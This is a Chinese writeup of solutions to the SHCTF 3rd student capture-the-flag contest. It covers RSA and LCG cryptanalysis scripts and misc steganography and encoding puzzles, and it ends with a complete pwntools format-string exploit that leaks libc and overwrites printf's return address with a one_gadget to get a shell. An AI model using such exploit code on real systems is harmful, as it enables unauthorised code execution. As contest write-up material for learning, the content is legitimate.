# [个人队伍] 第三届SHCTF的Writeup

> **2026年2月2日10:00 ~ 2026年2月10日22:00**
>
> **比赛地址：https://shc.tf/games/1/info**
>
> **复现地址：https://shc.tf/games/1/info**

> # SHCTF 3rd
>
> SHCTF 3rd 是由来自 西安邮电大学、齐鲁工业大学（山东省科学院）、长春工程学院、齐鲁师范学院、长春理工大学、哈尔滨工业大学（威海）、菏泽学院、湖南警察学院、闽江师范高等专科学校、罗定职业技术学院、西安工业大学、云南大学、浙江大学、珠海科技学院、赣西科技职业学院、杭州电子科技大学信息工程学院、湖南人文科技学院、淮南联合大学、山东商业职业技术学院、山东协和学院、三亚学院、深圳职业技术大学、梧州学院、西北师范大学、盐城工学院、郑州商学院、中国科学技术大学 共27所高校的网络安全团队共同举办的**CTF新生赛**，目前已是第三届举办。
>
> 官方的中文称呼为 第三届山河CTF
>
> 本次比赛采取传统 **Jeopardy 解题个人赛** 的形式，持续 **一周** 时间，赛题采用动态分数制，涵盖 Web、Reverse、Pwn、Crypto、Misc 五大基础方向。
>
> 本赛事设置**高校赛道**，旨在为高校提供新生选拔与培养平台，助力实验室与战队发现并培养更多网络安全方向的优秀人才；同时设置**公开赛道**，希望与全国各地的师傅交流学习，共同进步。
>
> ------
>
> ### 赛程安排
>
> 比赛自 北京时间 **2026 年 2 月 2 日 10:00** (周一) 开始，至 **2026 年 2 月 10 日 22:00** (周二) 结束，共 8 天 12 小时；比赛结束前均可报名。
>
> 共分三次放题，第一批题目于 2 月 2 日 10:00 开赛时放出；第二批题目会于 2 月 4 日 10:00 放出；第三批题目会于 2 月 7 日 10:00 放出；不同批次题目会有不同的题目前缀标记。
>
> 所有题目的提交截止时间皆为比赛结束的时间，且三批题目的平均难度呈相对递增。
>
> ### 交流群
>
> 为确保信息传递的有效性， SHCTF 的所有官方通知将仅通过比赛平台及 QQ 群发布。若比赛平台遇到技术故障，期间所有重要公告将只在 QQ 群内发送。
>
> 参赛选手可加入 QQ 群: **536115792**；高校赛道可能有本校自行组织的群聊，在此无法提供相关信息
>
> 加入 QQ 群属于自愿行为，不加入不会影响参赛资格。但请注意，若因未及时获取群内信息而导致组织方无法与您取得联系，可能被视为您主动放弃相关质询权利。
>
> 比赛全程不设置群聊禁言，但恳请所有选手**遵守比赛规则**并保持文明交流。
>
> ------
>
> 特别提示: **高校赛道**分组邀请码请联系本校的负责人获取；**公开赛道无需邀请码**。
>
> ### 获奖相关
>
> 本次比赛设有奖励机制，目前安排如下：
>
> 1. 预计为 **公开赛道** 与 **高校赛道** 总排名各自 **前八名** 的有效参赛选手颁发实体证书，附送奖品的数量将小于等于证书发放数量，请希望获得证书的选手及时提交WP。
> 2. 高校赛道的额外奖品将依据各高校校内安排自行发放；证书及奖品的具体数量视最终预算与有效参赛总人数情况，可能会有所增加。
> 3. 因比赛的初衷是为新生举办的新生赛，证据明确的AI参赛选手会在赛后减去50%的有效分数作为平衡。
> 4. 由于证书及奖品目前处于设计制作阶段，预计发放时间待定，请获奖选手关注后续通知。
>    若在QQ群中无法及时联系，会通过报名时所使用邮箱进行通知，请确保您的邮箱可用。
>
> ### WriteUp提交
>
> 请选手提交思路明确、可读性强的 WriteUp (解题报告) 至官方邮箱 `3rd-writeup@shc.tf`。
>
> 作为新生性质的比赛，在此不对愿意提交自己WriteUp的选手进行排名限制。
>
> 格式要求:
>
> 1. 请以**独立附件**的形式附在邮件发送（推荐 PDF 或 Markdown），而不是将大篇内容直接粘贴在邮件正文中；
> 2. 若单个附件大于 20MB，请拆分为多个附件发送；
> 3. **邮件主题**请务必包含 `队伍名称-排名` (例如: `kaguya-21`)，其他内容可自行补充。
>
> ### 比赛规则
>
> 1. 本比赛为**个人赛**，请勿与**他人**交流任何与题目相关的信息；每个队伍同时开启的容器数为 2 个。
> 2. 若题目无特殊说明， flag 字符串的形式皆为 `SHCTF{*}`，请提交包含 `SHCTF{}` 的完整 flag。
> 3. 本次比赛的题目采用动态分数制，每道题目的分值会随着解出数的增加而减少，减少的速度与题目预设难度相关。最终排名根据总分确定，在得分相同的情况下，越早达到这一分值的队伍排名越高。
>    每题前三支成功解出该题目的队伍将会获得基于当前题目分值的额外加分奖励，比例分别为 3%，2% 和 1%。
> 4. 本次赛事主要面向新生群体，因此题目设计上以基础知识和基础技能为主要考查内容，整体难度较为平易。
>    需要特别提醒的是，尽管当前大模型能够辅助求解部分问题，但比赛的初衷在于鼓励选手通过独立思考与实践来提升个人能力，过度依赖大模型会影响思考能力和知识摄取。
> 5. 特别补充规则，因比赛的初衷是为新生举办的新生赛，证据明确的AI参赛选手会在赛后减去50%的有效分数作为平衡。
>
> ### 其他信息
>
> 如需反馈建议、提供举报信息等，如不希望通过QQ等社交媒体，请发送邮件到 `contact@shc.tf`。
>
> 平台可用性状态监控: https://status.shc.tf/
>
> ## 致谢
>
> - 山东汉任信息安全技术有限公司
> - 烽壤信息科技（甘肃）有限责任公司
> - 山东鹏云信息科技有限公司
>
> **本次赛事得到以上单位的大力支持，在此对其进行特别感谢。**
>
> 感谢 **第三届 SHCTF 出题组** 的师傅们为本届比赛所提供的赛题。
>
> 感谢 CarboFish 师傅开发的 [A1CTF](https://github.com/carbofish/A1CTF) 平台。



# 阶段1

## crypto

### Ez_RSA

#### 题目信息

> **Challenge Info - [阶段1] Ez_RSA**
>
> 题目难度: **简单**
>
> 出题人：**Perplexity**
>
> ------
>
> e怎么这么大啊

#### 解题过程

**查看题目**

```python
from Crypto.Util.number import getPrime,bytes_to_long
from gmpy2 import invert
from secret import flag

m = bytes_to_long(flag)

p = getPrime(512)
q = getPrime(512)
n = p*q
phi = (p-1) * (q-1)
e = getPrime(1019)
d = invert(e, phi)

c = pow(m,e,n)
"""
n = 107464134871680646151655304067173578951022679613817744422854142736895193478923970402314237869266898585661396817719803005109183572552933963881756199330890085692291647461683934019264121186823772581796061998307778635680038707808422026396560620912393186072263186503236380890048319797143644270579169484448179083299
e = 3924586561728843234261049280560557566669922961436496251423249382498887294225142535297862819865029081145630384268177735578769958711287734205364353929040337350836000661255957087233897675207507752217828489549059197109918195953230752720210793300168746820366115929509596904295875481061789801178045962611893883689
c = 4557192604704814579224198928010541193712311907197292139423304635523945088581321950910727673367241811197226152299201713883344661436550024661781925551129803469824570154317098612833694631836257698682075695287756551674264966935203485636255394639674521955953445322493019052791894426980946209383266707043869522774
"""
```

**分析**

- 这是**rsa中e很大**的情况
- 我们一般采用**Wiener**攻击
- 可以直接套公式

#### 题目答案

**最终脚本**

```python
import gmpy2
import libnum

def continuedFra(x, y):
   cf = []
   while y:
       cf.append(x // y)
       x, y = y, x % y
   return cf
def gradualFra(cf):
   numerator = 0
   denominator = 1
   for x in cf[::-1]:
       numerator, denominator = denominator, x * denominator + numerator
   return numerator, denominator
def solve_pq(a, b, c):
   par = gmpy2.isqrt(b * b - 4 * a * c)
   return (-b + par) // (2 * a), (-b - par) // (2 * a)
def getGradualFra(cf):
   gf = []
   for i in range(1, len(cf) + 1):
       gf.append(gradualFra(cf[:i]))
   return gf
def wienerAttack(e, n):
   cf = continuedFra(e, n)
   gf = getGradualFra(cf)
   for d, k in gf:
       if k == 0:
           continue
       if (e * d - 1) % k != 0:
           continue
       phi = (e * d - 1) // k
       p, q = solve_pq(1, n - phi + 1, n)
       if p * q == n:
           return d
n = 107464134871680646151655304067173578951022679613817744422854142736895193478923970402314237869266898585661396817719803005109183572552933963881756199330890085692291647461683934019264121186823772581796061998307778635680038707808422026396560620912393186072263186503236380890048319797143644270579169484448179083299
e = 3924586561728843234261049280560557566669922961436496251423249382498887294225142535297862819865029081145630384268177735578769958711287734205364353929040337350836000661255957087233897675207507752217828489549059197109918195953230752720210793300168746820366115929509596904295875481061789801178045962611893883689
c = 4557192604704814579224198928010541193712311907197292139423304635523945088581321950910727673367241811197226152299201713883344661436550024661781925551129803469824570154317098612833694631836257698682075695287756551674264966935203485636255394639674521955953445322493019052791894426980946209383266707043869522774

d = wienerAttack(e, n)
m = pow(c, d, n)

print(libnum.n2s(m).decode())
```

```shell
SHCTF{e950ea87356fc62ce6323253a672680e}
```

**得到：SHCTF{e950ea87356fc62ce6323253a672680e}**



### Stream

#### 题目信息

> **Challenge Info - [阶段1] Stream**
>
> 题目难度: **简单**
>
> 出题人：**v1c0**
>
> ------
>
> LCCCGGGGG

#### 解题过程

**查看题目**

```python
from secrets import randbits
from secret import FLAG, P_known


def gen():
    while True:
        m = randbits(63) | (1 << 62) | 1
        if m > 2**62:
            break
    a = randbits(62) | 3
    c = randbits(62) | 1
    s0 = randbits(62) | 5
    return m, a, c, s0

def LCG(m, a, c, s0, nblocks):
    x = s0
    out = []
    for _ in range(nblocks):
        x = (a * x + c) % m
        out.append(x)
    return out

def encrypt(m, a, c, s0, plaintext: bytes) -> bytes:
    padlen = (-len(plaintext)) % 8
    pt = plaintext + b'\x00' * padlen
    blocks = [int.from_bytes(pt[i:i+8], 'big') for i in range(0, len(pt), 8)]
    ks = LCG(m, a, c, s0, len(blocks))
    cblocks = [b ^ k for b, k in zip(blocks, ks)]
    return b''.join(cb.to_bytes(8, 'big') for cb in cblocks)

def main():
    m, a, c, s0 = gen()
    cipher  = encrypt(m, a, c, s0,  P_known + FLAG)

    C_known = cipher[:len(P_known)]
    C_flag  = cipher[len(P_known):len(P_known) + len(FLAG)]

    print("P_known =",P_known)
    print("C_known =", C_known.hex())
    print("C_flag  =", C_flag.hex())

if __name__ == "__main__":
    main()


'''

P_know = b'Insecure_linear_congruential_random_number!!!!!!'
C_known = 44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a
C_flag  = 1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a

'''
```

**分析**

- 流密码

#### 题目答案

**最终脚本**

```python
def decrypt_flag():
    
    # 已知信息
    P_known = b'Insecure_linear_congruential_random_number!!!!!!'
    C_known_hex = '44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a'
    C_flag_hex = '1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a'

    # 计算P_known的长度
    len_p_known = len(P_known)
    total_len = ((len_p_known + 7) // 8) * 8

    # 填充P_known到8的倍数
    padded_p_known = P_known + b'\x00' * (total_len - len_p_known)

    # 将填充后的P_known转换为blocks
    p_blocks = [int.from_bytes(padded_p_known[i:i + 8], 'big') for i in range(0, len(padded_p_known), 8)]

    # 将C_known转换为bytes
    c_known_bytes = bytes.fromhex(C_known_hex)
    c_known_padded = c_known_bytes[:total_len]

    # 将C_known转换为blocks
    c_known_blocks = [int.from_bytes(c_known_padded[i:i + 8], 'big') for i in range(0, len(c_known_padded), 8)]

    # 计算密钥流 ks = p_blocks ^ c_known_blocks
    ks = [p ^ c for p, c in zip(p_blocks, c_known_blocks)]

    # 计算差值
    diffs = [ks[i + 1] - ks[i] for i in range(len(ks) - 1)]

    # 计算多个可能的m值
    possible_ms = []
    for i in range(1, len(diffs) - 1):
        t = abs(diffs[i + 1] * diffs[i - 1] - diffs[i] ** 2)
        possible_ms.append(t)

    # 找到所有可能m值的最大公约数
    def gcd(a, b):
        while b:
            a, b = b, a % b
        return a

    def gcd_list(numbers):
        from functools import reduce
        return reduce(gcd, numbers)

    if possible_ms:
        m = gcd_list(possible_ms)
    else:
        return None

    # 计算模逆元
    def modinv(a, m):
        g, x, y = extended_gcd(a, m)
        if g != 1:
            return None
        else:
            return x % m

    def extended_gcd(a, b):
        if a == 0:
            return (b, 0, 1)
        else:
            g, y, x = extended_gcd(b % a, a)
            return (g, x - (b // a) * y, y)

    # 计算a的值
    inv_d0 = modinv(diffs[0], m)
    if inv_d0 is None:
        return None

    a = (diffs[1] * inv_d0) % m

    # 计算c的值
    c = (ks[1] - a * ks[0]) % m

    # 将C_flag转换为bytes
    c_flag_bytes = bytes.fromhex(C_flag_hex)
    len_c_flag = len(c_flag_bytes)

    # 计算需要的block数
    num_blocks = ((len_c_flag + 7) // 8)

    # 填充C_flag到8的倍数
    padded_c_flag = c_flag_bytes + b'\x00' * ((num_blocks * 8) - len_c_flag)

    # 将C_flag转换为blocks
    c_flag_blocks = [int.from_bytes(padded_c_flag[i:i + 8], 'big') for i in range(0, len(padded_c_flag), 8)]

    # 生成完整的密钥流
    generated_ks = []
    current = ks[0]  # 从s0开始
    for i in range(num_blocks + 6):  # 生成足够的密钥流，包括前6个用于加密P_known的block
        generated_ks.append(current)
        current = (a * current + c) % m

    # 提取用于解密C_flag的密钥流（从第7个block开始）
    flag_ks = generated_ks[6:6 + num_blocks]

    # 解密FLAG
    flag_blocks = [c ^ k for c, k in zip(c_flag_blocks, flag_ks)]

    # 将flag_blocks转换为bytes
    flag_bytes = b''
    for fb in flag_blocks:
        fb_positive = fb & ((1 << 64) - 1)
        flag_bytes += fb_positive.to_bytes(8, 'big')

    # 移除可能的填充
    # 查找FLAG的结束位置（第一个非ASCII字符）
    import string
    valid_chars = set(string.printable)
    valid_end = len(flag_bytes)
    for i, byte in enumerate(flag_bytes):
        if chr(byte) not in valid_chars:
            valid_end = i
            break

    flag = flag_bytes[:valid_end]

    return flag


if __name__ == "__main__":
    flag = decrypt_flag()
    if flag:
        print(flag.decode('utf-8'))

```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
SHCTF{LLLLLLLLLLLLLLLCCCCCGGGGGGGGG_TGY%JgWOmAM6V5n55w3m*jcPJZjHO8E1VvzrGjT84tXS332D&o4GZe8%KKzEyAngmwwx9bp5dv_O4dPpOvMy1^hM}=

进程已结束，退出代码为 0
```

**得到：SHCTF{LLLLLLLLLLLLLLLCCCCCGGGGGGGGG_TGY%JgWOmAM6V5n55w3m*jcPJZjHO8E1VvzrGjT84tXS332D&o4GZe8%KKzEyAngmwwx9bp5dv_O4dPpOvMy1^hM}**



### TE

#### 题目信息

> **Challenge Info - [阶段1] TE**
>
> 题目难度: **入门**
>
> 出题人：**v1c0**
>
> ------
>
> 贝祖???

#### 解题过程

**查看题目**

```python
from Crypto.Util.number import *
import random
from secret import flag



p, q = getPrime(512), getPrime(512)
n = p * q

e1 = random.getrandbits(32)
e2 = random.getrandbits(32)

print(f'{e1 = }')
print(f'{e2 = }')

m = bytes_to_long(flag)
c1 = pow(m, e1, n)
c2 = pow(m, e2, n)

print(f'{n = }')
print(f'{c1 = }')
print(f'{c2 = }')


'''
e1 = 740153575
e2 = 2865243571
n = 136622832042809215646904518487100682818433235485047740604612449039291802103378650845690420527029208661555957840623544220907967041438993189882681277161437473818861280518627112617436473837014181944318974950710633690704711613682306786783611123590732850783007770603201513394002330426718261667816328404673167404897
c1 = 56187319559060690757544481076112948328826527679002578544683022765347668056620384831778729489197135280950314627119815558644487151419126272267146826463912815062442590228193753706779325992179790583792001196548329204758137104234662611732735693150331594645734142941475121453410494160975503459516324097097434727685
c2 = 45042409947237296641429229414329516753664139389113206575966507524195434716702812078844474626406932213486611190698953613898299571473488550533642524208077653917354039305279692307471529748408234617430389423630015569730564585740596832844917494965974840512412454337766930330443409183293514761911902752336129193323
'''
```

**分析**

- 共模攻击
- 直接套公式

#### 题目答案

**最终脚本**

```python
from Crypto.Util.number import *
from gmpy2 import gmpy2

e1 = 740153575
e2 = 2865243571
n = 136622832042809215646904518487100682818433235485047740604612449039291802103378650845690420527029208661555957840623544220907967041438993189882681277161437473818861280518627112617436473837014181944318974950710633690704711613682306786783611123590732850783007770603201513394002330426718261667816328404673167404897
c1 = 56187319559060690757544481076112948328826527679002578544683022765347668056620384831778729489197135280950314627119815558644487151419126272267146826463912815062442590228193753706779325992179790583792001196548329204758137104234662611732735693150331594645734142941475121453410494160975503459516324097097434727685
c2 = 45042409947237296641429229414329516753664139389113206575966507524195434716702812078844474626406932213486611190698953613898299571473488550533642524208077653917354039305279692307471529748408234617430389423630015569730564585740596832844917494965974840512412454337766930330443409183293514761911902752336129193323

g, s1, s2 = gmpy2.gcdext(e1, e2)
m = pow(c1, s1, n) * pow(c2, s2, n) % n
flag = long_to_bytes(gmpy2.iroot(m, g)[0]).decode()

print(flag)
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
SHCTF{lYQkkk3ud4hqV3fZtPWH077vhI2Bqcz19ZRxf1vwRU8Ej4uvrJcF02Sd4bzjxqUH5096qWDIdTyEJ$JzF}

进程已结束，退出代码为 0
```

**得到：SHCTF{lYQkkk3ud4hqV3fZtPWH077vhI2Bqcz19ZRxf1vwRU8Ej4uvrJcF02Sd4bzjxqUH5096qWDIdTyEJ$JzF}**





## misc

### Evan

#### 题目信息

> **Challenge Info - [阶段1] Evan**
>
> 题目难度: **入门**
>
> 出题人：**so**
>
> ------
>
> so作为一位资深的CTF女师傅，却是个乙游的狂热爱好者，这是她珍藏已久的照片，找出flag

#### 解题过程

```shell
foremost flag.png
```

```shell
foremost: D:\Program Files\foremost\foremost.conf: No such file or directory
Processing: flag.png
|foundat=flag.txt
                 鰌q玽-K虌7,?6埾0蒏)6萂U?
*|
```

查看flag.txt

```shell
SHCTF{Evan_1s_s0_h4nds0me!}
```

#### 题目答案

**得到：SHCTF{Evan_1s_s0_h4nds0me!}**



### Office

#### 题目信息

> **Challenge Info - [阶段1] Office**
>
> 题目难度: **入门**
>
> 出题人：**string**
>
> ------
>
> Office我只推荐MS，WPS是什么，我不知道

#### 解题过程

**下载解压得到：flag.docx**

**更改后缀名得到：flag.zip**

**解压flag.zip**

查看`word/document.xml`

```shell
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:oel="http://schemas.microsoft.com/office/2019/extlst" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cex="http://schemas.microsoft.com/office/word/2018/wordml/cex" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16="http://schemas.microsoft.com/office/word/2018/wordml" xmlns:w16du="http://schemas.microsoft.com/office/word/2023/wordml/word16du" xmlns:w16sdtdh="http://schemas.microsoft.com/office/word/2020/wordml/sdtdatahash" xmlns:w16sdtfl="http://schemas.microsoft.com/office/word/2024/wordml/sdtformatlock" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se w16cid w16 w16cex w16sdtdh w16sdtfl w16du wp14"><w:body><w:p w14:paraId="7C4CFF52" w14:textId="16B776E7" w:rsidR="00425C81" w:rsidRPr="004B2F8F" w:rsidRDefault="00793174"><w:pPr><w:rPr><w:vanish/></w:rPr></w:pPr><w:r w:rsidRPr="004B2F8F"><w:rPr><w:rFonts w:hint="eastAsia"/><w:vanish/></w:rPr><w:t>lRy1m2qYkmewkTqDrneCoTCQoUiFqm7zqoeRoT7DqDCAqm7QsTqRuT3PqjWUt5e7</w:t></w:r></w:p><w:p w14:paraId="2E0AED01" w14:textId="77777777" w:rsidR="004B2F8F" w:rsidRDefault="004B2F8F"><w:pPr><w:rPr><w:rFonts w:hint="eastAsia"/></w:rPr></w:pPr></w:p><w:sectPr w:rsidR="004B2F8F"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="851" w:footer="992" w:gutter="0"/><w:cols w:space="425"/><w:docGrid w:type="lines" w:linePitch="312"/></w:sectPr></w:body></w:document>
```

**得到密文：lRy1m2qYkmewkTqDrneCoTCQoUiFqm7zqoeRoT7DqDCAqm7QsTqRuT3PqjWUt5e7**

查看`word/theme/alphabet`

```shell
+/0-6a-zA-Z7-9=
```

**得到编码表：+/0-6a-zA-Z7-9=**

**还原编码表得到：+/0123456abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ789=**

**解码得到：SHCTF{MS_Office_is_the_best_office_software.wps}**

#### 题目答案

**得到：SHCTF{MS_Office_is_the_best_office_software.wps}**



### 不止二维码

#### 题目信息

> **Challenge Info - [阶段1] 不止二维码**
>
> 题目难度: **简单**
>
> 出题人：**Mnzn**
>
> ------
>
> 咦，二维码，扫一下

#### 解题过程

用**StegSolve**解图片得到三张不同的二维码，扫码得到线索

```shell
FLAG_PART_1: SHCTF{55a23d24-
FLAG_PART_2: ABBB/AABBB/AAAAA/BBBBB/ABBBBA/BBBBA/B/AABBB/ABBB
FLAG_PART_3: MkZkbDg3ZlY3ZEQxalNGenQyZUFYT3E0NmRrTXFV
```

**第二部分**用**摩斯密码**解码得到：**B705-4E7B**

**第三部分**用Base全家桶解码

```shell
密文 -> Base64 -> Base62 -> Base58 -> Base32 -> -942e-bdd}
```

**得到：-942e-bdd}**

**拼起来得到**

```shell
SHCTF{55a23d24- B705-4E7B -942e-bdd}
```

#### 题目答案

**得到：SHCTF{55a23d24-B705-4E7B-942e-bdd}**



### 签到

#### 题目信息

> **Challenge Info - [阶段1] 签到**
>
> 题目难度: **入门**
>
> 出题人：**SHCTF**
>
> ------
>
> 扫码关注公众号，并发送：**『马』上「赢」盛世山河**
>
> 即可获取本题flag

#### 解题过程

**扫码**

**发送：『马』上「赢」盛世山河**

**得到：SHCTF{WiSh1ng_y0u_@_HaPpy_NEw_Ye@r_1n_Adv@nCe!}**

#### 题目答案

**得到：SHCTF{WiSh1ng_y0u_@_HaPpy_NEw_Ye@r_1n_Adv@nCe!}**



### 薇薇安的美照

#### 题目信息

> **Challenge Info - [阶段1] 薇薇安的美照**
>
> 题目难度: **简单**
>
> 出题人：**Zero**
>
> ------
>
> 学了一天化学的Zero，决定去打打绝区零里，flag格式：SHCTF{**}记得flag是大写的呢

#### 解题过程

用**WinHex**打开图片，在末尾看到

```shell
SHCTF{MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=}
```

用**Base64**解码得到

```shell
SHCTF{1_8_74_20_7_92_16_5_18_8_7}
```

用**元素周期表**对应得到

```shell
SHCTF{H_O_W_CA_N_U_S_B_AR_O_N}
```

#### 题目答案

**得到：SHCTF{H_O_W_CA_N_U_S_B_AR_O_N}**



## pwn

### baby_fmt

#### 题目信息

> **Challenge Info - [阶段1] baby_fmt**
>
> 题目难度: **简单**
>
> 出题人：**TUTo**
>
> ------
>
> 简单的格式化字符串漏洞，你会吗?

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/fmt/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'/home/kali/Desktop/ctf/debug'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- Linux64位小端序
- GOT表不可写
- NX
- PIE
- 影子栈(对于leave; ret;结尾的函数调用不可修改栈上的返回地址)

**查看源码**

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char format[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+108h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  strcpy(format, "text:");
  while ( 1 )
  {
    printf("Input your text: ");
    fgets(&format[5], 256, stdin);
    printf(format);
  }
}
```

```assembly
.plt.sec:0000000000001070 _printf         proc near               ; CODE XREF: main+4A↓p
.plt.sec:0000000000001070                                         ; main+7D↓p
.plt.sec:0000000000001070 ; __unwind {
.plt.sec:0000000000001070                 endbr64
.plt.sec:0000000000001074                 bnd jmp cs:printf_ptr
.plt.sec:0000000000001074 _printf         endp
```

**分析**

- 我们可以知道`printf`函数的调用不是用`leave; ret;`结尾的，所以我们可以覆盖`printf`的返回地址为`libc`上的`onegadget`
- 先泄露`libc`基地址，然后泄露一个`stack`的地址，计算得到`printf`的返回地址，用**fmtstr_payload**修改**地址值**
- 易得初始偏移为**6**，为适应**"text:"**我们多输入三字节凑够**7**个偏移

**数据搜集**

```shell
one_gadget libc.so.6
```

```shell
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

#### 题目答案

**最终脚本**

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("challenge.shc.tf", 31246)
# r = process(["./pwn"])

libc = ELF("./libc.so.6")
elf = ELF("./pwn")
rop = ROP([elf])

# gdb.attach(r, "b *$rebase(0x126B)") # printf

payload = "|%43$p|%61$p|%45$p|".encode()
r.sendlineafter("Input your text: ".encode(), payload)

r.recvuntil('|'.encode())

main_elf_addr = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16)
main_elf_offset = 0x11EE
elf_base_addr = main_elf_addr - main_elf_offset
print("elf_base_addr", hex(elf_base_addr))

libc_start_main_libc_addr = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16) - 128
libc_start_main_libc_offset = 0x29dc0
libc_base_addr = libc_start_main_libc_addr - libc_start_main_libc_offset
print("libc_base_addr", hex(libc_base_addr))

stack_offset_addr = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16)
print("stack_offset_addr", hex(stack_offset_addr))

fmt_offset = 7

printf_ret_stack_offset = -0x230
printf_ret_stack_addr = stack_offset_addr + printf_ret_stack_offset
print("printf_ret_stack_addr", hex(printf_ret_stack_addr))

system_got_libc_offset = libc.sym["system"]
system_got_libc_addr = libc_base_addr + system_got_libc_offset
print("system_got_libc_addr", hex(system_got_libc_addr))

one_gadget_libc_offset = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
one_gadget_libc_addr = libc_base_addr + one_gadget_libc_offset[1]
print("one_gadget_libc_addr", hex(one_gadget_libc_addr))

payload = cyclic(0x3)
payload += fmtstr_payload(fmt_offset, {printf_ret_stack_addr : one_gadget_libc_addr}, numbwritten = 0x8)
print("payload_length", len(payload))
print("payload_content", payload)
r.sendlineafter("Input your text: ".encode(), payload)

r.interactive()
r.close()
```

```shell
